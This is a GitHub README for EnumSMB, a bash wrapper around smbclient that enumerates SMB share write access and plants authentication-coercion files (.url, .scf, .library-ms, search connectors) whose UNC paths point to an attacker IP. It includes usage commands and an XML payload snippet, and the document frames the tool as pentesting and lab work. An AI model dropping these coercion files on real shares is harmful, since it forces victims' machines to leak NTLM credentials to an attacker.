# EnumSMB

<img width="1011" height="273" alt="image" src="https://github.com/user-attachments/assets/6f7c444d-492e-4ead-a5ce-f857141fe67e" />

**EnumSMB** is a weaponized, military-grade, standalone bash wrapper for `smbclient`. It is designed to automate the SMB file share auditing and coercion deployment lifecycle, transforming standard directory enumeration into a rapid, zero-dependency workflow.

It handles recursive share parsing, structural escape-sequence healing, and automated multi-vector coercion deployment. High-value writable targets are instantly identified with LinPEAS-style colorized output, allowing rapid evaluation of authentication coercion vectors.

This was developed to streamline SMB share enumeration, payload deployment, and environmental post-engagement cleanup during network analysis workflows.

---

## 🎯 Features

* **Multi-Vector Coercion Arsenal:** Embedded template engines for six distinct file types (`.url`, `.scf`, `.library-ms`, `.search-ms`, `.searchConnector-ms`, `.search`) to test file-explorer background parsing behavior and outbound connection handling.
* **Admin Share Fast-Tracking:** Automatically identifies default administrative endpoints (like `C$` and `ADMIN$`) to verify Local Admin privileges instantly. If accessible, they are flagged as `[ADMIN ACCESS]`, but explicitly excluded from recursive crawls and payload drops to maintain OPSEC and execution speed.
* **Precision Share Auditing:** Recursively crawls deeper directory layouts and applies a non-destructive verification check (`mkdir`/`rmdir` loops) to explicitly validate write capabilities rather than relying on superficial top-level share flags.
* **Dual-Track Execution (`all`):** Maps out real-time share directory permissions on screen while simultaneously staging selected structural templates in every single writable target directory.
* **Dynamic Variable Interfacing:** Utilizes unquoted shell here-documents with localized backslash escaping to inject context-aware attacker IPs (`$USER_IP`) and share designations (`$SHARE`) directly into configuration payloads on the fly.
* **Surgical Cleanup Engine (`clean`):** Features a comprehensive removal mode that scans all accessible paths to selectively sweep and purge the hardcoded hidden files (`.background-image.*`) once validation is complete.

---

## 📦 Dependencies

This tool relies on standard network utilities natively available on Kali Linux, Parrot OS, or any standard Linux distribution:

* `smbclient`
* Standard Linux processing utilities: `grep`, `sed`, `tr`

---

## 🚀 Usage

```bash
Usage: ./enumsmb.sh -i <target_IP> -l <user_IP> -m <mode> [-t <template>] [-u <user>] [-p <pass>] [-s <share>]

Modes:
  enum       : Check read/write permissions on all directories
  write      : Silent upload (all templates if -t omitted)
  all        : Enumerate and upload simultaneously
  clean      : Remove template files (all extensions if -t omitted)

Templates:
  url                 : Internet Shortcut (.url)
  scf                 : Windows Explorer Command (.scf)
  library-ms          : Windows Library Description (.library-ms)
  search-ms           : Saved Search (.search-ms)
  searchConnector-ms  : Search Connector (.searchConnector-ms)
  search              : Generic Search Config (.search)
```

### Examples

**Standard Anonymous Share Enumeration:**

```bash
./enumsmb.sh -i 10.129.23.236 -l 10.10.14.127 -m enum
```

**Mass Deployment of All Coercion Templates (Authenticated):**

```bash
./enumsmb.sh -i 10.129.23.236 -l 10.10.14.127 -m write -u 'ldap_monitor' -p '1GR8t@$$4u'
```

**Targeted Deployment of a Specific Vector (Simultaneous Enum & Write):**

```bash
./enumsmb.sh -i 10.129.23.236 -l 10.10.14.127 -m all -t library-ms -s 'loot_share'
```

**Surgical Multi-Extension Post-Engagement Cleanup:**

```bash
./enumsmb.sh -i 10.129.23.236 -l 10.10.14.127 -m clean
```

---

### 🦖 See it in Action

<img width="1221" height="1174" alt="image" src="https://github.com/user-attachments/assets/aa32e786-2996-4407-b765-4cf942ea8b16" />

<img width="1413" height="913" alt="image" src="https://github.com/user-attachments/assets/cce5375c-ecb2-4824-a571-01febf82811d" />

<img width="1399" height="1405" alt="image" src="https://github.com/user-attachments/assets/b7f095bb-1ba0-4dde-86da-e82cb2dff808" />

<img width="1374" height="684" alt="image" src="https://github.com/user-attachments/assets/bfd63950-a89d-4721-9efe-8d944d58d9a6" />

---

## 🧠 Deep-Dive

### 👻 Windows Shell Architecture Coercion (The Vectors)

Outbound connection coercion targets the automatic metadata parsing routines inherent to modern graphical file browsers and indexing systems. When a user or system process interacts with a folder, the OS reads file headers to determine visual layouts before a file is ever opened.

The script incorporates multiple distinct structural formats to evaluate how a target network processes these background requests:

#### 1. Desktop Shell Interaction (`.url` / `.scf`)

These plain-text configuration files communicate directly with the local desktop shell. The shell parses the `IconFile` property to fetch the corresponding graphic representation. By mapping this property to a remote UNC destination, any process loading the folder view automatically generates outbound traffic to retrieve the target asset.

#### 2. XML Storage Aggregation (`.library-ms` / `.search-ms`)

Windows Library structures utilize an XML schema to combine physically separated storage locations into a single unified directory tree. The script defines custom search locations within the XML framework:

```xml
<simpleLocation>
  <url>\\\\$USER_IP\\$SHARE\\icon.ico</url>
</simpleLocation>
```

When accessed or indexed, the parsing engine processes the `<url>` block, causing the host operating system to query the specified destination over the network to synchronize tracking states.

---

### ❓ Recursive Top-Level and Subdirectory Validation

Relying solely on top-level share permissions frequently creates false positives during file system audits. A network share might be flagged as globally readable, yet specific subfolders deep within the inheritance tree can maintain separate access control lists (ACLs).

**EnumSMB** enforces deep-track verification using nested evaluation loops:

```bash
smbclient "//$IP/$SHARE" -c "recurse ON; ls" | grep '^\\'
```

#### 1. Tree Processing

The tool initiates a full tree crawl via `recurse ON`, capturing folder headers. Each discovered pathway is then isolated and passed into an autonomous logic check.

#### 2. Non-Destructive Active Probing

Rather than guessing rights based on server response codes, the tool executes an operational test directly inside each specific path location:

```bash
smbclient ... -c "cd \"$target_dir\"; mkdir check_perm_dir"
```

If the execution string encounters an access error or an `NT_STATUS_` denial flag, it logs the path as strictly read-only. If the creation succeeds, it immediately issues a corresponding `rmdir` statement to restore the folder state and flags the location as highly write-accessible. This provides a direct, empirically validated map of actual directory permissions across the network.

#### 3. Admin Share Fast-Tracking (OPSEC Optimization)

If the tool detects access to `C$` or `ADMIN$`, it immediately confirms Local Administrator privileges. However, executing a recursive crawl or mass-dropping payloads across the entire Windows file system is inherently noisy and severely impacts execution speed. **EnumSMB** hard-stops execution on these specific shares after the initial access check, logging the win while preventing EDR alerts and network flooding.

---

## ⚠️ Disclaimer

This tool is designed for educational purposes and authorized infrastructure auditing / penetration testing only. The author is not responsible for any misuse, operational disruption, or data modification caused by this script. Always ensure you have explicit, written authorization before analyzing target environments.

---

**Author:** [tralsesec](https://github.com/tralsesec)

**License:** MIT
